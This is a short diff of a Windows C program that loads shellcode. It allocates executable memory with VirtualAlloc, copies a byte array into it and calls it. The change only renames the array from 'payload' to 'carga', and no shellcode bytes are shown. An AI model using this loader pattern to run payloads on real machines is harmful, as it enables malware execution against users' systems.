@@ -1,7 +1,7 @@
 #include <stdio.h>
 #include <windows.h>
 
-unsigned const char payload[] =
+unsigned const char carga[] =
 
 //shellcode
 
@@ -15,7 +15,7 @@ int main(int argc, char** argv) {
 	
     code = (char*)VirtualAlloc(NULL, size, MEM_COMMIT,PAGE_EXECUTE_READWRITE);
 	
-    memcpy(code, payload, size);
+    memcpy(code, carga, size);
 	
     ((void(*)())code)();
 	
